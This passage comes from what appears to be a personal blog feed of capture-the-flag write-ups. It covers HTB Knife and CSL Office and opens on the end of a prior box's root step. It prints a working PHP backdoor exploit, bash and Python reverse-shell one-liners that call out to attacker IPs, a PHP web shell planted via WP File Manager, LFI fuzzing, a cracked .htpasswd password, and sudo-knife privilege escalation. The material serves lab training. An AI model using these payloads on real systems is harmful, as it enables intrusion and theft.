<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">euid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span>
bash-5.0# cat /root/root.txt
81d35170fb50fe21ed42cbda4a45913e
</code></pre></td></tr></table>
</div>
</div><h1 id="explore-how-the-container-jail">Explore how the container jail</h1>
<p>traffic was indeed dropped</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">bash-5.0# cat /root/iptables.sh
<span style="color:#6272a4">#!/bin/bash</span>
<span style="color:#6272a4"># Docker kept screwing with the FORWARD chain when using iptables-persistent...</span>
<span style="color:#ff79c6">if</span> <span style="color:#ff79c6">[[</span> ! -f <span style="color:#f1fa8c">&#34;/tmp/iptables-set&#34;</span> <span style="color:#ff79c6">]]</span>; <span style="color:#ff79c6">then</span>
        /usr/sbin/iptables -A INPUT -p tcp -m tcp --dport <span style="color:#bd93f9">9002</span> -j DROP
        /usr/sbin/iptables -A INPUT -p tcp -m tcp --dport <span style="color:#bd93f9">9001</span> -j DROP
        /usr/sbin/iptables -A INPUT -p tcp -m tcp --dport <span style="color:#bd93f9">9000</span> -j DROP
        /usr/sbin/iptables -I INPUT -s 172.16.0.0/12 -j ACCEPT
        /usr/sbin/iptables -I INPUT -s 127.0.0.0/8 -j ACCEPT
        /usr/sbin/iptables -I FORWARD -s 172.16.0.0/12 ! -d 172.16.0.0/12 -j DROP
<span style="color:#ff79c6">fi</span>
touch /tmp/iptables-set
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Knife</title><link>https://0xade1.github.io/posts/2021/09/htb-knife/</link><pubDate>Fri, 03 Sep 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/htb-knife/</guid><description>nmap nmap -v -p- --min-rate 5000 10.10.10.242 nmap -p22,80 -sC -sV 10.10.10.242 [..] PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e🆎22:0e:c0:ee (ECDSA) |\_ 256 1a🇩🇪a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |\_http-server-header: Apache/2.4.41 (Ubuntu) |\_http-title: Emergent Medical Idea Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel sudo nmap -p80 --script=vuln 10.10.10.242 no known vulnerabilities for the above</description><content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
<pre tabindex="0"><code>nmap -v -p- --min-rate 5000 10.10.10.242

nmap -p22,80 -sC -sV 10.10.10.242
[..]
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
| 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e🆎22:0e:c0:ee (ECDSA)
|\_ 256 1a🇩🇪a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-server-header: Apache/2.4.41 (Ubuntu)
|\_http-title: Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

sudo nmap -p80 --script=vuln 10.10.10.242
</code></pre><p>no known vulnerabilities for the above</p>
<h1 id="gobuster">gobuster</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -k -u http://10.10.10.242 -w /opt/dictionaries/directory-list-2.3-medium.txt -t <span style="color:#bd93f9">30</span> -x txt,php,html,swp,log,md
</code></pre></td></tr></table>
</div>
</div><p>Nothing</p>
<h1 id="burp">burp</h1>
<p>We find response header: <code>X-Powered-By: PHP/8.1.0-dev</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">searchsploit <span style="color:#f1fa8c">&#34;PHP 8.1.0-dev&#34;</span>
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
PHP 8.1.0-dev - <span style="color:#f1fa8c">&#39;User-Agentt&#39;</span> Remote Code Execution | php/webapps/49933.py
</code></pre></td></tr></table>
</div>
</div><h1 id="exploitation">exploitation</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 /opt/exploitdb/exploits/php/webapps/49933.py
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242
Can&#39;t acces tty; job crontol turned off.
$ id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">(</span>james<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">(</span>james<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">(</span>james<span style="color:#ff79c6">)</span>

$ cat /home/james/user.txt
288<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>

$ sudo -l
Matching Defaults entries <span style="color:#ff79c6">for</span> james on knife:
env_reset, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin

User james may run the following commands on knife:
<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/knife
</code></pre></td></tr></table>
</div>
</div><h1 id="upgrading-a-real-shell">upgrading a real shell</h1>
<p>We need to replace single quote with double quote in the payload:
<code>/usr/bin/bash -c &quot;exec /usr/bin/bash -i &amp;&gt;/dev/tcp/10.10.14.112/11111 &lt;&amp;1&quot;</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -lnvp <span style="color:#bd93f9">11111</span>
Connection from 10.10.10.242:36424
bash: cannot <span style="color:#8be9fd;font-style:italic">set</span> terminal process group <span style="color:#ff79c6">(</span>947<span style="color:#ff79c6">)</span>: Inappropriate ioctl <span style="color:#ff79c6">for</span> device
bash: no job control in this shell
james@knife:/$
</code></pre></td></tr></table>
</div>
</div><h1 id="privilege-escalation">privilege escalation</h1>
<p>According to <a href="https://docs.chef.io/workstation/knife_exec/">https://docs.chef.io/workstation/knife_exec/</a> , <code>knife</code> can execute ruby script. We have similar finding on <a href="https://gtfobins.github.io/gtfobins/knife/">https://gtfobins.github.io/gtfobins/knife/</a></p>
<p><code>ruby -e 'exec &quot;/bin/sh&quot;'</code> and <code>knife exec -E 'exec &quot;/bin/sh&quot;'</code> will both result in obtaining a shell</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">james@knife:/$ sudo knife <span style="color:#8be9fd;font-style:italic">exec</span> -E <span style="color:#f1fa8c">&#39;exec &#34;/bin/sh&#34;&#39;</span>
sudo knife <span style="color:#8be9fd;font-style:italic">exec</span> -E <span style="color:#f1fa8c">&#39;exec &#34;/bin/sh&#34;&#39;</span>
id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
cat /root/root.txt
747<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>CSL - Office</title><link>https://0xade1.github.io/posts/2021/08/csl-office/</link><pubDate>Sun, 22 Aug 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/08/csl-office/</guid><description>Exploration nmap -p- -sC -sV -T4 -v 172.31.3.1 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) gobugobuster dir -u http://172.31.3.1 -w /opt/dictionaries/directory-list-2.3-medium.txt /wp-content (Status: 301) /wp-includes (Status: 301) /wp-admin(Status: 301) gobuster dir -k -u https://172.31.3.1 -w /opt/dictionaries/directory-list-2.3-medium.txt /forum (Status: 301) /wordpress (Status: 301) Exploring the /forum, we find possible file inclusion link and indeed: https://172.</description><content type="html"><![CDATA[<h1 id="exploration">Exploration</h1>
<pre tabindex="0"><code>nmap -p- -sC -sV -T4 -v 172.31.3.1
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu))

gobugobuster dir -u http://172.31.3.1 -w /opt/dictionaries/directory-list-2.3-medium.txt
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-admin(Status: 301)

gobuster dir -k -u https://172.31.3.1 -w /opt/dictionaries/directory-list-2.3-medium.txt
/forum (Status: 301)
/wordpress (Status: 301)
</code></pre><p>Exploring the /forum, we find possible file inclusion link and indeed: https://172.31.3.1/forum/chatlogs/chatlogs.php?file=../../../../../../../etc/passwd</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wfuzz --hh<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1095</span> -z file,/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt https://172.31.3.1/forum/chatlogs/chatlogs.php<span style="color:#f1fa8c">\?</span>file<span style="color:#f1fa8c">\=</span>FUZZ

<span style="color:#6272a4"># ID Response Lines Word Chars Payload</span>

000000114: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">254</span> L <span style="color:#bd93f9">1177</span> W <span style="color:#bd93f9">8311</span> Ch <span style="color:#f1fa8c">&#34;/etc/apache2/apache2.conf&#34;</span>
000000128: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">37</span> L <span style="color:#bd93f9">139</span> W <span style="color:#bd93f9">1569</span> Ch <span style="color:#f1fa8c">&#34;/etc/fstab&#34;</span>
000000131: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">82</span> L <span style="color:#bd93f9">118</span> W <span style="color:#bd93f9">1825</span> Ch <span style="color:#f1fa8c">&#34;/etc/group&#34;</span>
000000198: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">36</span> L <span style="color:#bd93f9">88</span> W <span style="color:#bd93f9">1316</span> Ch <span style="color:#f1fa8c">&#34;/etc/hosts&#34;</span>
000000201: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">37</span> L <span style="color:#bd93f9">120</span> W <span style="color:#bd93f9">1506</span> Ch <span style="color:#f1fa8c">&#34;/etc/hosts.allow&#34;</span>
000000202: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">44</span> L <span style="color:#bd93f9">174</span> W <span style="color:#bd93f9">1806</span> Ch <span style="color:#f1fa8c">&#34;/etc/hosts.deny&#34;</span>
000000229: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">382</span> L <span style="color:#bd93f9">1113</span> W <span style="color:#bd93f9">9276</span> Ch <span style="color:#f1fa8c">&#34;/etc/init.d/apache2&#34;</span>
000000230: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">29</span> L <span style="color:#bd93f9">68</span> W <span style="color:#bd93f9">1121</span> Ch <span style="color:#f1fa8c">&#34;/etc/issue&#34;</span>
000000241: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">50</span> L <span style="color:#bd93f9">198</span> W <span style="color:#bd93f9">1964</span> Ch <span style="color:#f1fa8c">&#34;/etc/mysql/my.cnf&#34;</span>
000000243: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">47</span> L <span style="color:#bd93f9">126</span> W <span style="color:#bd93f9">1608</span> Ch <span style="color:#f1fa8c">&#34;/etc/nsswitch.conf&#34;</span>
000000250: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">59</span> L <span style="color:#bd93f9">105</span> W <span style="color:#bd93f9">2766</span> Ch <span style="color:#f1fa8c">&#34;/etc/passwd&#34;</span>
000000371: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">150</span> L <span style="color:#bd93f9">461</span> W <span style="color:#bd93f9">4386</span> Ch <span style="color:#f1fa8c">&#34;/etc/ssh/sshd_config&#34;</span>
000000376: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">31</span> L <span style="color:#bd93f9">108</span> W <span style="color:#bd93f9">1498</span> Ch <span style="color:#f1fa8c">&#34;/etc/updatedb.conf&#34;</span>
000000394: <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">28</span> L <span style="color:#bd93f9">64</span> W <span style="color:#bd93f9">1140</span> Ch <span style="color:#f1fa8c">&#34;../.htpasswd&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>content of <code>../.htpasswd</code> is a hash <code>dwight:$apr1$7FARE4DE$lKgF/R9rSUEY6s.L79/dM/</code> we can bruteforce</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/john/run/john --wordlist<span style="color:#ff79c6">=</span>/opt/dictionaries/rockyou.txt --rules <span style="color:#8be9fd;font-style:italic">hash</span>
/opt/john/run/john --show <span style="color:#8be9fd;font-style:italic">hash</span>
dwight:cowboys1
</code></pre></td></tr></table>
</div>
</div><p>We can try to login the wordpress admin interface, but it requires to edit /etc/hosts, adding:
<code>172.31.3.1 office.csl</code></p>
<p>In <a href="http://office.csl/wp-admin">http://office.csl/wp-admin</a> , we find WP File Manager that we can use to create <code>reverse.php</code> file:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php <span style="color:#ff79c6">echo</span> system(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;cmd&#34;</span>]); <span style="color:#ff79c6">?&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>We can refer to <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a> to get a reverseshell</p>
<pre><code>http://office.csl/reverse.php?cmd=whoami

http://office.csl/reverse.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.0.155&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>
<p>We obtain a reverse shell:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lnvp <span style="color:#bd93f9">1337</span>
Connection from 172.31.3.1:54978
$ <span style="color:#8be9fd;font-style:italic">pwd</span>
/var/www/html/wordpress
$ whoami
www-data
</code></pre></td></tr></table>
</div>
</div><p>We can pivot to dwight user:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
